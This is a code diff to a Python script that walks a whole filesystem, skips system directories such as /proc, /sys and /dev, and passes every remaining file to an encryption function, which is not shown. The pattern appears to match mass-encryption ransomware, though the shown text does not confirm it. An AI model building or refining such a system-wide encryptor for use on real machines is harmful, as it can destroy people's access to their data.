@@ -49,12 +49,14 @@ python_env_path = os.path.dirname(os.path.dirname(sys.executable))
 # Get the Node.js environment path managed by nvm
 nvm_path = os.path.expanduser("~/.nvm")
 
-# Get common system paths to exclude
+# Get common system paths to exclude, including the newly added /proc directory
 system_paths = [
     "/usr/share",
     "/var/log",
     "/dev",
-    "/sys"
+    "/sys",
+    "/proc",  # Added to prevent freezing
+    "/usr/lib/php"
 ]
 
 # Function to encrypt a file
@@ -77,8 +79,10 @@ def get_all_files(root_dir, exclude_paths):
             continue
         for file in files:
             file_path = os.path.join(root, file)
-            if os.path.basename(file_path) not in EXCLUDE_FILES and not any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
-                yield file_path
+            if os.path.basename(file_path) in EXCLUDE_FILES or any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
+                logging.debug(f"Skipping file {file_path}")
+                continue
+            yield file_path
 
 # Function to process files in chunks
 def process_files_in_chunks(files, chunk_size=10):
@@ -141,6 +145,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
